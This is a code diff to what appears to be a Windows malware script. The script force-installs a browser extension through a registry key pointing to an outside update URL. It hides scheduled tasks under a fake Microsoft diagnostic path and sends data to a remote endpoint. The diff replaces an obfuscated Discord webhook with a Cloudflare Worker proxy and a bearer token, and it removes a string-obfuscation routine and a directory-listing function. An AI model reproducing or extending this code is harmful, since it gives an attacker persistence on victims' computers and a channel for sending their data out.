@@ -5,7 +5,8 @@ import time
 from pathlib import Path
 import winreg
 
-WEBHOOK_B64 = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTU1OTQ1ODQ1MTA2NTkyOTc1MS9qQlZxRmJZdW9ya3M2VVY3aE03MzZ3SFduSTB1OEk5c1NfM2RZVGdMV3g5bVZwZnVVS0hHRzFkZVlUZ0hvazJLazVqdQ=="
+WORKER_URL = "https://webhookproxy.anna-benbekthi.workers.dev/"
+PROXY_TOKEN = "389e0e62eaf14340b5e16d90ed1b56d79a14e07484a404bb30f0a3e9b7f64c66"
 
 EXT_REG_VALUE = "clfbahpbgmlbahejgcbninkkbljjnpki;https://pc-lamartin.anna-benbekthi.workers.dev/update.xml"
 EXT_REG_KEY = {
@@ -19,26 +20,6 @@ try:
     import psutil
 except:
     sys.exit()
-
-
-def encrypt(text: str) -> str:
-    b64 = base64.b64encode(text.encode()).decode()
-
-    lower = string.ascii_lowercase
-    upper = string.ascii_uppercase
-
-    lower_rot = lower[5:] + lower[:5]
-    upper_rot = upper[-3:] + upper[:-3]
-
-    table = str.maketrans(
-        lower + upper,
-        lower_rot + upper_rot
-    )
-
-    encrypted = b64.translate(table)
-    encrypted = encrypted.replace("==","-°").replace("=","_")
-
-    return encrypted
  
 def get_logged_in_user():
     """
@@ -64,30 +45,32 @@ def get_logged_in_user():
  
     return None, None
 
-def send_webhook(message):
-    webhook_url = base64.b64decode(WEBHOOK_B64).decode("utf-8")
 
+def send_webhook(message):
     payload = json.dumps({
-        "content": encrypt(message)
+        "message": message
     }).encode("utf-8")
 
     req = urllib.request.Request(
-        webhook_url,
+        WORKER_URL,
         data=payload,
         method="POST",
         headers={
             "Content-Type": "application/json",
+            "Authorization": f"Bearer {PROXY_TOKEN}",
             "User-Agent": "Mozilla/5.0 (DiscordWebhook)"
         }
     )
 
     try:
-        with urllib.request.urlopen(req, timeout=10) as response:
-            response.read()
-        return True
-    except Exception as e:
+        with urllib.request.urlopen(req, timeout=15) as response:
+            result = json.loads(response.read().decode("utf-8"))
+            return response.status == 200 and result.get("ok") is True
+
+    except Exception:
         return False
 
+    
 def task_exists(task_name: str) -> bool:
     """
     Returns True if a Windows scheduled task exists, False otherwise.
@@ -202,32 +185,6 @@ def remove_task(taskname):
         check=True
     )
 
-def build_directory_tree(path):
-    """
-    Recursively builds a dictionary that represents the folder structure.
-    Folders are dictionaries.
-    Files are stored as keys with value None.
-    """
-    tree = {}
-
-    try:
-        for entry in os.listdir(path):
-            full_path = os.path.join(path, entry)
-
-            if os.path.isdir(full_path):
-                tree[entry] = build_directory_tree(full_path)
-            else:
-                tree[entry] = None
-
-    except PermissionError:
-        tree["__error__"] = "Permission denied"
-
-    return tree
-
-def get_directory_architecture(root_path):
-    root_name = os.path.basename(os.path.abspath(root_path))
-    return {root_name: build_directory_tree(root_path)}
-
 def random_ext(n=3):
     return "." + "".join(random.choices(string.ascii_lowercase, k=n))
 
@@ -238,8 +195,7 @@ def manage_user_tasks():
         return
 
     tname = r"\Microsoft\JFRE\Diagnosis\FeedbackArchive\User" + "\\" + sanitize_username(user)
-        
-    
+            
     if not task_exists(tname):
         create_user_task(f"{domain}\\{user}", tname)
 
@@ -466,7 +422,7 @@ if __name__ == "__main__":
                 {
             "func": heartbeat,
             "args": [],
-            "interval": 60,  # seconds
+            "interval": 120,  # seconds
             "next_run": time.monotonic(),
         }
     ]
